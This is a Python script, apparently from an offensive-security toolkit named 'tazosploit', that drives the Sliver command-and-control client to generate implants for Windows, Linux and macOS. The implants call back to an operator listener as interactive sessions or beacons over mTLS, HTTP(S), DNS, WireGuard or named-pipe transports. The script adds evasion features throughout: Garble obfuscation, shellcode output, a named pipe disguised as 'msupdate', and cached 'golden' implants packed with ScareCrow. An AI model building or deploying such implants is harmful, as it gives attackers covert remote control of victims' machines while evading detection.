#!/usr/bin/env python3
"""generate_implant.py — Generate Sliver C2 implants for target deployment.

Wraps sliver-client generate to produce implants tailored to the target OS, arch,
and transport. Supports session (interactive) and beacon (async) modes.

Usage:
    python3 generate_implant.py --os windows --arch amd64 --transport mtls --mode session
    python3 generate_implant.py --os linux --arch arm64 --format elf --mode beacon --interval 60 --jitter 30
    python3 generate_implant.py --os windows --arch amd64 --format shellcode --evasion

Outputs:
    - The implant binary at the specified --save path (or auto-generated path)
    - A JSON metadata file at <save_path>.meta.json with generation details
"""

import argparse
import json
import logging
import os
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("generate_implant")

# Defaults
SLIVER_CLIENT = os.getenv("SLIVER_CLIENT_BIN", "/usr/local/bin/sliver-client")
SLIVER_CONFIG = os.getenv("SLIVER_CONFIG", "/opt/sliver/configs/kali-operator.cfg")
SLIVER_LISTENER_HOST = os.getenv("SLIVER_LISTENER_HOST", "sliver")
SLIVER_LISTENER_PORT = os.getenv("SLIVER_LISTENER_PORT", "8888")
GOLDEN_DIR = os.getenv("GOLDEN_IMPLANTS_DIR", "/opt/sliver/golden")
OUTPUT_DIR = os.getenv("OUTPUT_DIR", "/pentest/output")

# Format extension mapping
FORMAT_EXT = {
    "exe": ".exe",
    "shared": ".dll",
    "service": ".exe",
    "shellcode": ".bin",
    "elf": "",
}

# OS → default format
OS_DEFAULT_FORMAT = {
    "windows": "exe",
    "linux": "elf",
    "darwin": "elf",
}


def build_generate_command(args: argparse.Namespace) -> list[str]:
    """Build the sliver-client generate command from parsed arguments."""
    cmd = [SLIVER_CLIENT]

    if os.path.isfile(SLIVER_CONFIG):
        cmd.extend(["--config", SLIVER_CONFIG])

    cmd.append("generate")

    # Beacon mode uses a subcommand
    if args.mode == "beacon":
        cmd.append("beacon")

    # Transport flag
    transport = args.transport.lower()
    listener_addr = f"{args.lhost}:{args.lport}"
    if transport == "mtls":
        cmd.extend(["--mtls", listener_addr])
    elif transport == "https":
        cmd.extend(["--http", f"https://{listener_addr}"])
    elif transport == "http":
        cmd.extend(["--http", f"http://{listener_addr}"])
    elif transport == "dns":
        cmd.extend(["--dns", args.lhost])
    elif transport == "wg":
        cmd.extend(["--wg", listener_addr])
    elif transport == "named-pipe":
        cmd.extend(["--named-pipe", args.named_pipe or r"\\.\pipe\msupdate"])
    else:
        log.error(f"Unknown transport: {transport}")
        sys.exit(1)

    # OS and arch
    cmd.extend(["--os", args.os])
    cmd.extend(["--arch", args.arch])

    # Format
    fmt = args.format or OS_DEFAULT_FORMAT.get(args.os, "exe")
    if fmt == "elf":
        # Sliver doesn't have --format elf; for Linux it auto-selects ELF
        # Only pass --format for non-default formats
        if args.os != "linux":
            cmd.extend(["--format", fmt])
    else:
        cmd.extend(["--format", fmt])

    # Output path
    save_path = args.save or _auto_save_path(args.os, args.arch, fmt, args.mode)
    cmd.extend(["--save", save_path])

    # Implant name
    if args.name:
        cmd.extend(["--name", args.name])

    # Evasion (Garble obfuscation)
    if args.evasion:
        cmd.append("--evasion")

    # Beacon-specific options
    if args.mode == "beacon":
        cmd.extend(["--seconds", str(args.interval)])
        cmd.extend(["--jitter", str(args.jitter)])

    # Canary domain
    if args.canary:
        cmd.extend(["--canary", args.canary])

    return cmd, save_path, fmt


def _auto_save_path(target_os: str, arch: str, fmt: str, mode: str) -> str:
    """Generate an automatic save path based on target parameters."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    ext = FORMAT_EXT.get(fmt, "")
    filename = f"tazosploit-{mode}-{target_os}-{arch}-{timestamp}{ext}"
    return os.path.join("/tmp", filename)


def check_golden_implant(target_os: str, arch: str, transport: str, mode: str) -> str | None:
    """Check if a pre-built golden implant exists for the target configuration."""
    golden_base = Path(GOLDEN_DIR)
    patterns = [
        golden_base / target_os / arch / f"{mode}_{transport}_scarecrow.dll",
        golden_base / target_os / arch / f"{mode}_{transport}_raw.bin",
        golden_base / target_os / arch / f"{mode}_{transport}.exe",
        golden_base / target_os / arch / f"{mode}_{transport}.elf",
        golden_base / "shellcode" / f"{target_os}_{arch}_{transport}.bin",
    ]
    for p in patterns:
        if p.is_file() and p.stat().st_size > 0:
            log.info(f"Found golden implant: {p}")
            return str(p)
    return None


def generate_implant(args: argparse.Namespace) -> dict:
    """Generate a Sliver implant and return metadata."""
    start_time = time.time()

    # Check for golden implant first (unless --fresh is set)
    if not args.fresh:
        golden = check_golden_implant(args.os, args.arch, args.transport, args.mode)
        if golden:
            metadata = {
                "status": "success",
                "source": "golden",
                "implant_path": golden,
                "target_os": args.os,
                "target_arch": args.arch,
                "transport": args.transport,
                "mode": args.mode,
                "format": "golden",
                "evasion": False,
                "generation_time_s": round(time.time() - start_time, 2),
                "generated_at": datetime.now(timezone.utc).isoformat(),
            }
            return metadata

    # Build and execute generate command
    cmd, save_path, fmt = build_generate_command(args)
    log.info(f"Generating implant: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=args.timeout,
        )
    except subprocess.TimeoutExpired:
        log.error(f"Implant generation timed out after {args.timeout}s")
        return {
            "status": "error",
            "error": f"Generation timed out after {args.timeout}s",
            "command": " ".join(cmd),
        }
    except FileNotFoundError:
        log.error(f"sliver-client not found at {SLIVER_CLIENT}")
        return {
            "status": "error",
            "error": f"sliver-client binary not found at {SLIVER_CLIENT}",
        }

    elapsed = round(time.time() - start_time, 2)

    if result.returncode != 0:
        log.error(f"Implant generation failed (rc={result.returncode}): {result.stderr}")
        return {
            "status": "error",
            "error": result.stderr.strip(),
            "stdout": result.stdout.strip(),
            "command": " ".join(cmd),
            "return_code": result.returncode,
            "generation_time_s": elapsed,
        }

    # Verify output file exists
    if not os.path.isfile(save_path):
        # Sometimes sliver appends its own extension — search for it
        parent = os.path.dirname(save_path)
        base = os.path.basename(save_path)
        candidates = [
            os.path.join(parent, f)
            for f in os.listdir(parent)
            if f.startswith(base.split(".")[0])
        ]
        if candidates:
            save_path = max(candidates, key=os.path.getmtime)
            log.info(f"Implant saved at adjusted path: {save_path}")
        else:
            log.error(f"Implant file not found at {save_path}")
            return {
                "status": "error",
                "error": f"Expected implant at {save_path} but file not found",
                "stdout": result.stdout.strip(),
                "generation_time_s": elapsed,
            }

    file_size = os.path.getsize(save_path)
    log.info(f"Implant generated: {save_path} ({file_size} bytes, {elapsed}s)")

    metadata = {
        "status": "success",
        "source": "fresh",
        "implant_path": save_path,
        "implant_size_bytes": file_size,
        "target_os": args.os,
        "target_arch": args.arch,
        "transport": args.transport,
        "mode": args.mode,
        "format": fmt,
        "evasion": args.evasion,
        "implant_name": args.name,
        "listener": f"{args.lhost}:{args.lport}",
        "generation_time_s": elapsed,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "command": " ".join(cmd),
        "sliver_stdout": result.stdout.strip(),
    }

    if args.mode == "beacon":
        metadata["beacon_interval_s"] = args.interval
        metadata["beacon_jitter_s"] = args.jitter

    # Write metadata sidecar
    meta_path = save_path + ".meta.json"
    try:
        with open(meta_path, "w") as f:
            json.dump(metadata, f, indent=2)
        log.info(f"Metadata written to {meta_path}")
        metadata["metadata_path"] = meta_path
    except OSError as e:
        log.warning(f"Failed to write metadata file: {e}")

    return metadata


def main():
    parser = argparse.ArgumentParser(
        description="Generate Sliver C2 implants for target deployment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Windows session implant via mTLS
  %(prog)s --os windows --arch amd64 --transport mtls --mode session

  # Linux beacon with 60s check-in
  %(prog)s --os linux --arch amd64 --mode beacon --interval 60 --jitter 30

  # Windows shellcode for evasion pipeline
  %(prog)s --os windows --arch amd64 --format shellcode --evasion

  # Use golden implant if available (default behavior)
  %(prog)s --os windows --arch amd64

  # Force fresh generation (skip golden cache)
  %(prog)s --os windows --arch amd64 --fresh
        """,
    )

    parser.add_argument("--os", required=True, choices=["windows", "linux", "darwin"],
                        help="Target operating system")
    parser.add_argument("--arch", default="amd64", choices=["amd64", "arm64", "386"],
                        help="Target architecture (default: amd64)")
    parser.add_argument("--transport", default="mtls",
                        choices=["mtls", "https", "http", "dns", "wg", "named-pipe"],
                        help="C2 transport protocol (default: mtls)")
    parser.add_argument("--mode", default="session", choices=["session", "beacon"],
                        help="Implant mode: session (interactive) or beacon (async)")
    parser.add_argument("--format", default=None,
                        choices=["exe", "shared", "service", "shellcode"],
                        help="Implant output format (default: auto based on OS)")
    parser.add_argument("--save", default=None,
                        help="Output path for the implant (default: auto-generated in /tmp)")
    parser.add_argument("--name", default=None,
                        help="Custom implant name (default: Sliver auto-names)")
    parser.add_argument("--evasion", action="store_true",
                        help="Enable Garble obfuscation during generation")
    parser.add_argument("--fresh", action="store_true",
                        help="Skip golden implant cache, force fresh generation")
    parser.add_argument("--canary", default=None,
                        help="Canary domain for implant analysis detection")

    # Beacon options
    parser.add_argument("--interval", type=int, default=60,
                        help="Beacon check-in interval in seconds (default: 60)")
    parser.add_argument("--jitter", type=int, default=30,
                        help="Beacon jitter in seconds (default: 30)")

    # Listener address
    parser.add_argument("--lhost", default=SLIVER_LISTENER_HOST,
                        help=f"Listener host (default: {SLIVER_LISTENER_HOST})")
    parser.add_argument("--lport", default=SLIVER_LISTENER_PORT,
                        help=f"Listener port (default: {SLIVER_LISTENER_PORT})")
    parser.add_argument("--named-pipe", default=None,
                        help="Named pipe path for named-pipe transport")

    parser.add_argument("--timeout", type=int, default=300,
                        help="Generation timeout in seconds (default: 300)")
    parser.add_argument("--json", action="store_true",
                        help="Output result as JSON to stdout")

    args = parser.parse_args()
    result = generate_implant(args)

    if args.json:
        print(json.dumps(result, indent=2))
    else:
        if result["status"] == "success":
            print(f"[+] Implant generated: {result['implant_path']}")
            if result.get("implant_size_bytes"):
                print(f"    Size: {result['implant_size_bytes']} bytes")
            print(f"    OS/Arch: {result['target_os']}/{result['target_arch']}")
            print(f"    Transport: {result['transport']}")
            print(f"    Mode: {result['mode']}")
            print(f"    Source: {result['source']}")
            print(f"    Time: {result['generation_time_s']}s")
        else:
            print(f"[-] Generation failed: {result.get('error', 'unknown')}", file=sys.stderr)
            sys.exit(1)


if __name__ == "__main__":
    main()
